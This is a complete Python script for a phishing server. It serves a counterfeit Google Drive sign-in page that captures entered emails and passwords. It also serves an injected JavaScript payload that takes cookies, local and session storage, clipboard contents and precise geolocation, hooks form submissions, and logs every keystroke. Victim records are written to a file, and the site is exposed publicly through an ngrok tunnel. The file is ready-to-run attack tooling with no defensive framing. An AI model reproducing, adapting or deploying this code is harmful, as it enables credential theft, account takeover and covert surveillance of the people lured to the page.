#!/usr/bin/env python3
"""
Multi-Platform Phishing Page Generator & Server
Compatible with Termux, Windows, Linux. Generates a phishing page that captures:
- Device info (OS, browser, IP, screen res, timezone)
- Geolocation (with permission prompt)
- Local storage access (cookies, session data)
- Clipboard data
- File picker (fake upload for creds)
Serves via HTTP/HTTPS with ngrok tunnel support.
"""

import os
import sys
import json
import base64
import threading
import webbrowser
import subprocess
from datetime import datetime
from http.server import HTTPServer, SimpleHTTPRequestHandler
from urllib.parse import urlparse, parse_qs
import socket

# Cross-platform compatibility
IS_WINDOWS = os.name == 'nt'
IS_TERMUX = 'ANDROID_ROOT' in os.environ or 'PREFIX' in os.environ

def get_local_ip():
    """Get local IP address."""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except:
        return "127.0.0.1"

class PhishingHandler(SimpleHTTPRequestHandler):
    exfiltrated_data = []
    
    def do_GET(self):
        if self.path == '/':
            self.serve_phishing_page()
        elif self.path.startswith('/payload'):
            self.serve_payload()
        else:
            super().do_GET()
    
    def do_POST(self):
        content_length = int(self.headers['Content-Length'])
        post_data = self.rfile.read(content_length).decode('utf-8')
        parsed_data = parse_qs(post_data)
        
        # Extract all victim data
        victim_data = {
            'timestamp': datetime.now().isoformat(),
            'ip': self.client_address[0],
            'user_agent': self.headers.get('User-Agent', ''),
            'form_data': parsed_data,
            'raw_post': post_data
        }
        
        self.exfiltrated_data.append(victim_data)
        print(f"\n🚨 VICTIM DATA CAPTURED: {victim_data['ip']}")
        print(json.dumps(victim_data, indent=2))
        
        # Save to file
        with open('victims.json', 'a') as f:
            json.dump(victim_data, f)
            f.write('\n')
        
        self.send_response(200)
        self.send_header('Content-Type', 'text/html')
        self.end_headers()
        self.wfile.write(b'<script>window.location="/success.html";</script>')
    
    def serve_phishing_page(self):
        self.send_response(200)
        self.send_header('Content-Type', 'text/html')
        self.end_headers()
        self.wfile.write(PHISHING_HTML.encode())
    
    def serve_payload(self):
        self.send_response(200)
        self.send_header('Content-Type', 'application/javascript')
        self.end_headers()
        self.wfile.write(PHISHING_JS.encode())

# Embedded phishing page
PHISHING_HTML = """
<!DOCTYPE html>
<html>
<head>
    <title>Google Drive - Sign in to continue</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        * { margin:0; padding:0; box-sizing:border-box; }
        body { font-family: -apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Oxygen,Ubuntu,Cantarell,'Open Sans','Helvetica Neue',sans-serif; background:#f1f3f4; display:flex; justify-content:center; align-items:center; min-height:100vh; }
        .container { background:white; border-radius:8px; box-shadow:0 2px 10px rgba(0,0,0,0.1); width:100%; max-width:400px; padding:40px; text-align:center; }
        .logo { width:60px; height:60px; background:#4285f4; border-radius:3px; margin:0 auto 20px; display:flex; align-items:center; justify-content:center; color:white; font-weight:bold; font-size:24px; }
        input { width:100%; padding:12px; margin:10px 0; border:1px solid #ddd; border-radius:4px; font-size:16px; }
        button { width:100%; padding:12px; background:#4285f4; color:white; border:none; border-radius:4px; font-size:16px; cursor:pointer; margin:10px 0; }
        button:hover { background:#3367d6; }
        .error { color:#d93025; font-size:14px; margin:10px 0; display:none; }
        #progress { display:none; margin:20px 0; }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">G</div>
        <h2>Sign in to Google Drive</h2>
        <p>Access your files securely</p>
        
        <div id="error" class="error"></div>
        
        <div id="progress">
            <div style="width:100%; height:4px; background:#e0e0e0; border-radius:2px; overflow:hidden;">
                <div id="bar" style="height:100%; background:#4285f4; width:0%; transition:width 0.3s;"></div>
            </div>
        </div>
        
        <input type="email" id="email" placeholder="Email or phone" required>
        <input type="password" id="password" placeholder="Password" required>
        
        <button onclick="login()">Sign In</button>
        <button onclick="uploadFile()" style="background:#34a853;">Upload File</button>
    </div>

    <script src="/payload.js"></script>
    <script>
        function showError(msg) {
            document.getElementById('error').textContent = msg;
            document.getElementById('error').style.display = 'block';
        }
        
        function showProgress() {
            document.getElementById('progress').style.display = 'block';
            document.getElementById('bar').style.width = '100%';
        }
        
        async function login() {
            const email = document.getElementById('email').value;
            const password = document.getElementById('password').value;
            
            if (!email || !password) {
                showError('Please enter your credentials');
                return;
            }
            
            showProgress();
            
            // Send credentials
            const formData = new FormData();
            formData.append('email', email);
            formData.append('password', password);
            formData.append('action', 'login');
            
            await fetch('/', {
                method: 'POST',
                body: formData
            });
            
            setTimeout(() => {
                window.location.href = '/success.html';
            }, 1500);
        }
        
        function uploadFile() {
            const input = document.createElement('input');
            input.type = 'file';
            input.onchange = function(e) {
                const file = e.target.files[0];
                if (file) {
                    const reader = new FileReader();
                    reader.onload = function() {
                        const formData = new FormData();
                        formData.append('file', file.name);
                        formData.append('file_content', btoa(reader.result));
                        formData.append('action', 'upload');
                        
                        fetch('/', { method: 'POST', body: formData });
                    };
                    reader.readAsText(file);
                }
            };
            input.click();
        }
    </script>
</body>
</html>
"""

# JavaScript payload for advanced data exfiltration
PHISHING_JS = """
(function() {
    // Exfiltrate immediately on load
    const exfilData = {
        timestamp: new Date().toISOString(),
        userAgent: navigator.userAgent,
        language: navigator.language,
        platform: navigator.platform,
        cookie: document.cookie,
        referrer: document.referrer,
        screen: {
            width: screen.width,
            height: screen.height,
            availWidth: screen.availWidth,
            availHeight: screen.availHeight
        },
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        plugins: Array.from(navigator.plugins).map(p => p.name)
    };
    
    // Get localStorage
    for (let i = 0; i < localStorage.length; i++) {
        const key = localStorage.key(i);
        exfilData[key] = localStorage.getItem(key);
    }
    
    // Get sessionStorage
    for (let i = 0; i < sessionStorage.length; i++) {
        const key = sessionStorage.key(i);
        exfilData[`session_${key}`] = sessionStorage.getItem(key);
    }
    
    // Clipboard access
    if (navigator.clipboard && navigator.clipboard.readText) {
        navigator.clipboard.readText().then(text => {
            exfilData.clipboard = text;
            sendExfil(exfilData);
        }).catch(() => {});
    }
    
    // Geolocation
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(pos => {
            exfilData.location = {
                latitude: pos.coords.latitude,
                longitude: pos.coords.longitude,
                accuracy: pos.coords.accuracy
            };
            sendExfil(exfilData);
        }, () => {}, {enableHighAccuracy: true});
    }
    
    function sendExfil(data) {
        const formData = new FormData();
        formData.append('payload', JSON.stringify(data));
        formData.append('action', 'exfil');
        
        fetch('/', {
            method: 'POST',
            body: formData
        }).catch(() => {});
    }
    
    // Hook form submissions
    document.addEventListener('submit', function(e) {
        const formData = new FormData(e.target);
        formData.append('action', 'form_submit');
        formData.append('form_id', e.target.id || e.target.name);
        
        fetch('/', {
            method: 'POST',
            body: formData
        });
    });
    
    // Keylogger
    document.addEventListener('keydown', function(e) {
        fetch('/?keylog=' + encodeURIComponent(e.key + '|' + e.code), {method: 'GET'});
    });
})();
"""

def start_ngrok(port=8080):
    """Start ngrok tunnel (Termux/Windows/Linux compatible)."""
    try:
        if IS_TERMUX:
            subprocess.Popen(['ngrok', 'http', str(port)], stdout=subprocess.DEVNULL)
        else:
            subprocess.Popen(['ngrok', 'http', str(port)])
        print("🔗 ngrok tunnel started. Check http://localhost:4040 for public URL")
    except FileNotFoundError:
        print("⚠️  ngrok not found. Install it or access locally only.")
        print("Termux: pkg install ngrok")
        print("Linux: wget https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-amd64.tgz && tar xvzf ngrok*.tgz")

def main():
    port = 8080
    ip = get_local_ip()
    
    print("🐟 PHISHING SERVER STARTING...")
    print(f"📍 Local: http://{ip}:{port}")
    print(f"📱 Termux: http://localhost:{port}")
    
    # Start ngrok in background
    threading.Thread(target=start_ngrok, args=(port,), daemon=True).start()
    
    # Start server
    server = HTTPServer(('0.0.0.0', port), PhishingHandler)
    print(f"✅ Server running on port {port}")
    print("📁 Victim data saved to victims.json")
    print("🕐 Press Ctrl+C to stop")
    
    try:
        server.serve_forever()
    except KeyboardInterrupt:
        print("\n👋 Server stopped")
        sys.exit(0)

if __name__ == "__main__":
    main()